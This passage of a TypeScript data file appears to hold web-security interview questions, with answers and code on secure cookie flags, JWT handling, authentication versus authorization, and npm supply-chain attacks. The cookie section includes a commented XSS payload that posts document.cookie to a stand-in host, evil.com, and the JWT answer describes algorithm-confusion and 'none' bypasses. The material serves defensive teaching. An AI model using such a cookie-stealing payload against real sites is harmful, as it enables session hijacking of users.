          "Use the layered defense analogy: each layer catches what the other misses",
          "Mention Zod or similar runtime validation libraries for TypeScript projects",
        ],
      },
      {
        id: "sec-7",
        question:
          "What are secure cookie attributes (HttpOnly, Secure, SameSite) and how do they protect user sessions?",
        answer: `**Definition:** Secure cookie attributes are configuration flags that control how browsers handle cookies, providing protection against common attacks like XSS-based cookie theft, man-in-the-middle interception, and CSRF. The three primary security attributes — HttpOnly, Secure, and SameSite — each address a specific threat vector, and together they form a robust defense for session management.

**Attack Scenario:** Without these attributes, session cookies are vulnerable to multiple attacks. Without HttpOnly, an XSS vulnerability allows \`document.cookie\` to read the session token and send it to an attacker's server — enabling session hijacking. Without Secure, cookies are sent over unencrypted HTTP connections, allowing network attackers (on public Wi-Fi, for example) to intercept session tokens via man-in-the-middle attacks. Without SameSite, cookies are sent with every cross-origin request, enabling CSRF attacks where a malicious site triggers authenticated actions on the target site.

**Example:** A session cookie should be set with all three attributes: \`Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600\`. HttpOnly prevents JavaScript from accessing this cookie (\`document.cookie\` won't include it), so even if XSS occurs, the attacker can't steal the session token. Secure ensures the cookie is only sent over HTTPS connections, preventing interception on insecure networks. SameSite=Lax prevents the cookie from being sent with cross-site POST requests (preventing CSRF) while still allowing it on same-site navigations (clicking a link from an email to your site still works).

**Impact:** Each attribute mitigates a specific attack category. HttpOnly eliminates the most common XSS consequence (session theft) — even if an attacker can execute JavaScript via XSS, they can't access HttpOnly cookies, forcing them to perform actions within the XSS context rather than stealing the session for persistent access. Secure prevents the devastating simplicity of Wi-Fi cookie sniffing, which was famously demonstrated by the Firesheep tool. SameSite eliminates most CSRF attack scenarios by ensuring cookies aren't sent on cross-origin requests that the user didn't explicitly initiate.

**Prevention and Implementation:** For session cookies, always set all three attributes. SameSite has three values: Strict (cookies never sent cross-site — most secure but can break legitimate flows like clicking a link from email), Lax (cookies sent on top-level navigations but not on cross-site POST/AJAX — good balance), and None (cookies always sent cross-site — must be combined with Secure, used for legitimate cross-origin scenarios like embedded widgets). Modern browsers default to SameSite=Lax when no attribute is specified. Additionally, use the Path attribute to limit cookie scope, Max-Age or Expires for session lifetime control, and consider cookie prefixes (__Host- and __Secure-) for additional security guarantees.`,
        shortAnswer:
          "HttpOnly prevents JavaScript access to cookies (stops XSS cookie theft). Secure ensures cookies are only sent over HTTPS (prevents network interception). SameSite controls cross-origin cookie sending: Strict (never), Lax (top-level navigations only), None (always, requires Secure). All three should be set on session cookies.",
        code: `// Server: setting secure session cookie
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

// Express.js session configuration
import session from 'express-session';

app.use(session({
  name: '__Host-session', // __Host- prefix enforces Secure, Path=/
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,      // not accessible via document.cookie
    secure: true,        // HTTPS only
    sameSite: 'lax',     // prevents most CSRF
    maxAge: 3600000,     // 1 hour
    path: '/',
    domain: undefined,   // defaults to current host
  },
}));

// IMPACT DEMONSTRATION:

// Without HttpOnly — XSS can steal sessions
// Attacker's XSS payload:
// <script>
//   fetch('https://evil.com/steal', {
//     method: 'POST',
//     body: document.cookie  // Contains session token!
//   });
// </script>

// With HttpOnly — XSS cannot read the cookie
// document.cookie returns "" for HttpOnly cookies
// The session token is invisible to JavaScript

// SameSite behavior comparison:
// Strict: cookie NEVER sent cross-site
//   - Link from email to bank.com → no cookie → user must re-login
//   - Most secure, but can hurt UX

// Lax: cookie sent on top-level navigation, NOT on cross-site POST
//   - Link from email to bank.com → cookie sent → user stays logged in
//   - CSRF POST from evil.com → cookie NOT sent → attack blocked
//   - Good balance of security and usability

// None: cookie always sent cross-site (requires Secure flag)
//   - Needed for: embedded widgets, cross-site APIs, OAuth flows
//   Set-Cookie: widget=xyz; SameSite=None; Secure; HttpOnly

// Frontend: cookies with credentials in fetch
const response = await fetch('https://api.example.com/data', {
  credentials: 'include', // sends cookies cross-origin
});`,
        language: "typescript",
        difficulty: "Intermediate",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: ["cookies", "HttpOnly", "Secure", "SameSite", "session-security"],
        commonMistakes: [
          "Not setting HttpOnly on session cookies, allowing XSS to steal sessions",
          "Using SameSite=None without the Secure flag — browsers will reject the cookie",
          "Setting Secure cookies in development without HTTPS, then wondering why sessions don't persist",
          "Using SameSite=Strict when Lax would be more appropriate, breaking legitimate cross-site flows",
        ],
        followUps: [
          "What are __Host- and __Secure- cookie prefixes?",
          "How do you handle cookies in a development environment without HTTPS?",
          "What is the default SameSite value in modern browsers?",
        ],
        interviewTips: [
          "Map each attribute to the specific attack it prevents: HttpOnly→XSS, Secure→MITM, SameSite→CSRF",
          "Explain the three SameSite values with concrete scenarios",
          "Mention that modern browsers default to SameSite=Lax as a security improvement",
        ],
      },
      {
        id: "sec-8",
        question:
          "What is JWT security? What are common JWT vulnerabilities and best practices for secure token handling?",
        answer: `**Definition:** JSON Web Tokens (JWT) are a compact, URL-safe format for securely transmitting claims between parties. A JWT consists of three Base64URL-encoded parts separated by dots: a header (algorithm and type), a payload (claims/data), and a signature (cryptographic verification). JWTs are widely used for authentication (proving who you are) and authorization (proving what you can access) in modern web applications, particularly SPAs that communicate with APIs.

**Attack Scenario:** Common JWT attacks include: (1) Algorithm confusion — the attacker changes the header algorithm from RS256 to HS256 and signs the token with the server's public key (which is publicly available), tricking the server into using it as the HMAC secret. (2) None algorithm — the attacker sets the algorithm to "none" and removes the signature, and poorly configured servers accept it as valid. (3) Token theft — if JWTs are stored in localStorage, XSS can steal them. Unlike HttpOnly cookies, localStorage is fully accessible to JavaScript. (4) Missing expiration — tokens without exp claims are valid forever, so a stolen token grants permanent access.

**Example:** A typical JWT-based auth flow: the user logs in, the server creates a signed JWT with user claims (id, role, exp), and returns it to the client. The client includes this token in the Authorization header of subsequent API requests. The server verifies the signature and checks claims before processing the request. The security challenge is where to store the token and how to manage its lifecycle securely.

**Impact:** JWT vulnerabilities can lead to complete authentication bypass (algorithm confusion/none attacks), permanent unauthorized access (missing expiration), session hijacking (token theft from localStorage), and privilege escalation (modifying unverified claims). Since JWTs are self-contained, a compromised token gives the attacker everything they need — there's no server-side session to invalidate unless you implement a token revocation mechanism.

**Prevention best practices:** Always validate the algorithm server-side — never accept the token's header algorithm blindly. Use asymmetric algorithms (RS256) for distributed systems or HS256 with strong secrets for simple setups. Set short expiration times (15 minutes for access tokens) and use refresh tokens (stored in HttpOnly cookies) to obtain new access tokens. Store access tokens in memory (JavaScript variable) rather than localStorage or sessionStorage to prevent XSS theft. Implement token revocation via a deny list for critical security events (password change, logout). Validate all claims (iss, aud, exp, nbf) on every request. Consider using the BFF (Backend for Frontend) pattern where the backend manages tokens and the frontend uses HttpOnly session cookies.`,
        shortAnswer:
          'JWTs transmit signed claims for authentication/authorization. Common vulnerabilities: algorithm confusion (RS256→HS256), "none" algorithm bypass, XSS theft from localStorage, missing expiration. Best practices: validate algorithm server-side, short expiration, store in memory (not localStorage), use refresh tokens in HttpOnly cookies, validate all claims.',
        code: `// JWT Structure
// Header: { "alg": "RS256", "typ": "JWT" }
// Payload: { "sub": "user123", "role": "admin", "exp": 1719849600 }
// Signature: RSASHA256(base64(header) + "." + base64(payload), privateKey)

// SECURE: Store access token in memory, refresh token in HttpOnly cookie
let accessToken: string | null = null;

async function login(email: string, password: string): Promise<void> {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
    credentials: 'include', // server sets HttpOnly refresh token cookie
  });
  const data = await response.json();
  accessToken = data.accessToken; // stored in memory only
}

async function authenticatedFetch(url: string, options: RequestInit = {}): Promise<Response> {
  if (!accessToken) {
    await refreshAccessToken();
  }

  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: \`Bearer \${accessToken}\`,
    },
  });

  if (response.status === 401) {
    await refreshAccessToken();
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: \`Bearer \${accessToken}\`,
      },
    });
  }

  return response;
}

async function refreshAccessToken(): Promise<void> {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include', // sends HttpOnly refresh token cookie
  });
  if (!response.ok) {
    accessToken = null;
    window.location.href = '/login';
    return;
  }
  const data = await response.json();
  accessToken = data.accessToken;
}

// Server-side: validate JWT properly
// import jwt from 'jsonwebtoken';
//
// function verifyToken(token: string): JwtPayload {
//   return jwt.verify(token, publicKey, {
//     algorithms: ['RS256'],  // EXPLICIT algorithm whitelist
//     issuer: 'https://auth.example.com',
//     audience: 'https://api.example.com',
//   });
// }`,
        language: "typescript",
        difficulty: "Advanced",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "JWT",
          "authentication",
          "tokens",
          "refresh-tokens",
          "session-management",
        ],
        commonMistakes: [
          "Storing JWTs in localStorage — accessible to XSS attacks",
          "Not setting expiration (exp claim) on tokens",
          "Accepting the algorithm from the token header without server-side validation",
          "Not implementing token refresh — using long-lived access tokens instead",
        ],
        followUps: [
          "What is the BFF (Backend for Frontend) pattern for token management?",
          "How do you implement JWT token revocation?",
          "What is the difference between access tokens and refresh tokens?",
        ],
        interviewTips: [
          "Explain the three parts of a JWT and their purpose",
          "Emphasize the storage decision: memory > HttpOnly cookie > localStorage",
          "Show the refresh token flow as a best practice for short-lived access tokens",
        ],
      },
    ],
  },
  {
    id: "security-headers-auth",
    title: "Authentication, Authorization & Dependency Security",
    description:
      "Understanding authentication vs authorization, secure dependency management, and building defense-in-depth security for frontend applications.",
    category: "Security",
    difficulty: "Advanced",
    tags: [
      "authentication",
      "authorization",
      "dependencies",
      "supply-chain",
      "security-audit",
    ],
    overview:
      "Beyond protecting against specific attacks, frontend security requires understanding authentication and authorization patterns, securing the software supply chain through dependency management, and implementing defense-in-depth strategies that assume individual security measures may fail.",
    concepts: [
      "Authentication verifies identity; authorization verifies permissions",
      "Defense-in-depth uses multiple overlapping security layers",
      "Dependency security protects against supply-chain attacks",
      "Security headers provide browser-level protection",
      "Regular security audits catch vulnerabilities before attackers do",
    ],
    relatedTopicIds: ["web-security-attacks"],
    questions: [
      {
        id: "sec-9",
        question:
          "What is the difference between authentication and authorization? How do they work together in frontend applications?",
        answer: `**Definition:** Authentication (AuthN) is the process of verifying who a user is — confirming their identity through credentials like username/password, biometrics, or multi-factor authentication. Authorization (AuthZ) is the process of determining what an authenticated user is allowed to do — checking their permissions, roles, or access levels against protected resources and actions.

**Attack Scenario:** Confusing authentication and authorization leads to serious security flaws. A common vulnerability is authorization bypass: a user successfully authenticates (proves they are who they claim to be) and then accesses admin pages or other users' data because the application only checks authentication, not authorization. Example: User A authenticates and directly navigates to \`/api/users/userB/profile\` — if the server only verifies the JWT is valid but doesn't check whether User A has permission to access User B's profile, this is an Insecure Direct Object Reference (IDOR) vulnerability.

**Example flow:** A user logs in with email and password (authentication). The server verifies credentials and returns a JWT containing the user's ID and role. On subsequent requests, the server verifies the JWT signature (authentication) and then checks if the user's role permits the requested action (authorization). A "viewer" role can read reports but not edit them; an "admin" role can read, edit, and delete. The frontend enforces authorization in the UI (hiding edit buttons for viewers) while the backend enforces it definitively (rejecting unauthorized API calls regardless of UI manipulation).

**Impact:** Authentication failures allow unauthorized access to the system entirely — anyone can impersonate any user. Authorization failures are more nuanced: authenticated users access data or perform actions beyond their privilege level. Both are critical, but authorization bugs are more common because they're harder to test and often involve complex business rules.

**Prevention:** Frontend authorization is for UX only — never rely on hiding UI elements as a security measure. All authorization must be enforced on the backend because frontend code can be modified. Use role-based access control (RBAC) or attribute-based access control (ABAC) on the server. Implement the principle of least privilege — users should have only the minimum permissions needed. For routes in React, check permissions before rendering protected components, but always validate on the backend. Log authorization failures as potential security incidents.`,
        shortAnswer:
          "Authentication verifies identity (who you are); authorization verifies permissions (what you can do). Authentication happens first via credentials, then authorization checks roles/permissions for each action. Frontend authorization is UX only — all permission checks must be enforced server-side because client code can be manipulated.",
        code: `// Authentication: verify identity
async function authenticate(email: string, password: string): Promise<AuthResult> {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });

  if (!response.ok) throw new Error('Invalid credentials');
  return response.json(); // { token, user: { id, role, permissions } }
}

// Authorization: check permissions (frontend is UX only)
type Permission = 'read:reports' | 'write:reports' | 'manage:users' | 'admin:all';

interface User {
  id: string;
  role: 'viewer' | 'editor' | 'admin';
  permissions: Permission[];
}

function hasPermission(user: User, permission: Permission): boolean {
  return user.permissions.includes(permission) ||
         user.permissions.includes('admin:all');
}

// Protected Route component (UX-level authorization)
function ProtectedRoute({
  permission,
  children,
}: {
  permission: Permission;
  children: React.ReactNode;
}) {
  const { user } = useAuth();

  if (!user) return <Navigate to="/login" />;
  if (!hasPermission(user, permission)) return <Navigate to="/unauthorized" />;

  return <>{children}</>;
}

// Usage in routes
function AppRoutes() {
  return (
    <Routes>
      <Route path="/login" element={<LoginPage />} />
      <Route path="/reports" element={
        <ProtectedRoute permission="read:reports">
          <ReportsPage />
        </ProtectedRoute>
      } />
      <Route path="/admin" element={
        <ProtectedRoute permission="manage:users">
          <AdminPanel />
        </ProtectedRoute>
      } />
    </Routes>
  );
}

// Conditional UI based on permissions
function ReportCard({ report }: { report: Report }) {
  const { user } = useAuth();

  return (
    <div>
      <h2>{report.title}</h2>
      <p>{report.summary}</p>
      {hasPermission(user, 'write:reports') && (
        <button onClick={() => editReport(report.id)}>Edit</button>
      )}
    </div>
  );
}`,
        language: "typescript",
        difficulty: "Intermediate",
        type: "Conceptual",
        category: "Security",
        topicId: "security-headers-auth",
        tags: [
          "authentication",
          "authorization",
          "RBAC",
          "permissions",
          "protected-routes",
        ],
        commonMistakes: [
          "Relying on frontend authorization (hiding buttons) as a security measure",
          "Only checking authentication without checking authorization on API endpoints",
          "Storing user roles in JWT without revalidating — role changes won't take effect until token expires",
          "Using generic permission checks instead of resource-specific authorization",
        ],
        followUps: [
          "What is the difference between RBAC and ABAC?",
          "How do you handle permission changes in real-time with JWTs?",
          "What is the principle of least privilege?",
        ],
        interviewTips: [
          "Use a clear analogy: AuthN is like checking your ID at the door, AuthZ is like checking your ticket for VIP",
          "Emphasize that frontend authorization is UX, backend authorization is security",
          "Mention IDOR as a common authorization vulnerability to show practical awareness",
        ],
      },
      {
        id: "sec-10",
        question:
          "How do you secure frontend dependencies? Explain supply chain attacks and mitigation strategies.",
        answer: `**Definition:** Dependency security addresses the risks introduced by third-party packages in your application's supply chain. Modern JavaScript applications typically depend on hundreds or thousands of npm packages, each maintained by different authors. A supply chain attack compromises one of these packages — through account takeover, malicious code injection, or dependency confusion — to execute malicious code in every application that installs the compromised package.

**Attack Scenario:** In a supply chain attack, an attacker gains control of a popular npm package (through compromised maintainer credentials, typosquatting, or social engineering). They publish a new version containing malicious code that executes during installation (via postinstall scripts) or at runtime (stealing environment variables, injecting cryptocurrency miners, or exfiltrating data). Because npm install runs with the developer's full system permissions and CI/CD pipelines often have access to production secrets, the impact can be devastating. Notable real-world examples include the event-stream incident (cryptocurrency theft), ua-parser-js (cryptominer injection), and node-ipc (destructive protest-ware).

**Example:** The event-stream attack: an attacker offered to maintain a popular package (event-stream, 2M weekly downloads), was given access, and added a dependency (flatmap-stream) containing obfuscated code that targeted the Copay bitcoin wallet. When Copay's build process included event-stream, the malicious code stole wallet credentials from users. The attack was sophisticated — the malicious code only activated in the specific Copay build environment.

**Impact:** Supply chain attacks can affect millions of developers and end-users simultaneously. A single compromised package in your dependency tree can steal secrets, inject backdoors, or modify your application's behavior. The impact ranges from data theft and cryptocurrency mining to full system compromise. CI/CD environments are especially vulnerable because they often have access to production deployments, cloud credentials, and signing keys.

**Prevention** requires a multi-layered approach. Use lock files (package-lock.json, yarn.lock) to pin exact dependency versions and prevent automatic updates to compromised versions. Run \`npm audit\` regularly and in CI to detect known vulnerabilities. Use tools like Socket.dev or Snyk to detect suspicious package behavior (network access, filesystem access, obfuscated code). Enable npm's package provenance to verify packages were built from their claimed source repository. Minimize dependencies — evaluate whether you really need a package or if the functionality can be implemented in a few lines. Pin major versions in package.json and review changelogs before updating. Consider using a private registry or proxy (Verdaccio, Artifactory) to control which packages are available to your team. Disable postinstall scripts for untrusted packages with \`--ignore-scripts\`.`,
        shortAnswer:
          "Supply chain attacks compromise npm packages to execute malicious code in all downstream applications. Mitigation: use lock files, run npm audit in CI, use Socket.dev/Snyk for behavioral analysis, minimize dependencies, review updates before installing, disable postinstall scripts for untrusted packages, and consider private registries.",
        code: `// 1. Lock files pin exact versions
// package-lock.json ensures everyone gets identical dependency tree
// ALWAYS commit lock files to version control

// 2. npm audit in CI pipeline
// package.json
{
  "scripts": {
    "security:audit": "npm audit --audit-level=high",
    "security:check": "npx socket-security check",
    "preinstall": "npx npm-force-resolutions"
  }
}

// GitHub Actions CI security check
// .github/workflows/security.yml
// name: Security Audit
// on: [push, pull_request]
// jobs:
//   audit:
//     runs-on: ubuntu-latest
//     steps:
//       - uses: actions/checkout@v4
//       - run: npm ci
//       - run: npm audit --audit-level=high
//       - run: npx socket-security check

// 3. .npmrc security configuration
// .npmrc
// ignore-scripts=true        # disable postinstall scripts
// audit=true                 # audit on every install
// fund=false                 # skip funding messages

// 4. Review dependencies before adding
// Check: downloads, maintenance, known vulnerabilities, package size
function evaluateDependency(packageName: string): DependencyCheck {
  return {
    weeklyDownloads: 'Check npm for usage volume',
    lastPublished: 'Recent maintenance indicates active support',
    openIssues: 'Check GitHub for unresolved security issues',
    dependencies: 'Fewer transitive deps = smaller attack surface',
    bundleSize: 'Check bundlephobia.com for size impact',
    alternatives: 'Consider lighter or stdlib alternatives',
  };
}

// 5. Pin dependencies in package.json
{
  "dependencies": {
    "react": "18.3.1",          // exact version
    "react-dom": "18.3.1",      // exact version
    "@tanstack/react-query": "~5.50.0"  // patch updates only
  }
}

// 6. Subresource Integrity for CDN scripts
// <script
//   src="https://cdn.example.com/lib.js"
//   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
//   crossorigin="anonymous">
// </script>`,
        language: "typescript",
        difficulty: "Advanced",
        type: "Scenario",
        category: "Security",
        topicId: "security-headers-auth",
        tags: [
          "supply-chain",
          "npm-audit",
          "dependency-security",
          "npm",
          "lock-files",
        ],
        commonMistakes: [
          "Not committing lock files to version control, causing inconsistent installs",
          "Ignoring npm audit warnings because they seem like false positives",
          "Auto-merging dependabot PRs without reviewing the changes",
          "Adding packages for trivial functionality (left-pad syndrome)",
        ],
        followUps: [
          "What was the event-stream incident and what lessons does it teach?",
          "How does npm package provenance work?",
          "What is dependency confusion and how do you prevent it?",
        ],
        interviewTips: [
          "Mention real-world incidents (event-stream, ua-parser-js) to show awareness",
          "Emphasize the layered approach: lock files + audit + behavioral analysis + minimization",
          "Discuss the tradeoff between using dependencies and the security risk they introduce",
        ],
      },
    ],
  },
];
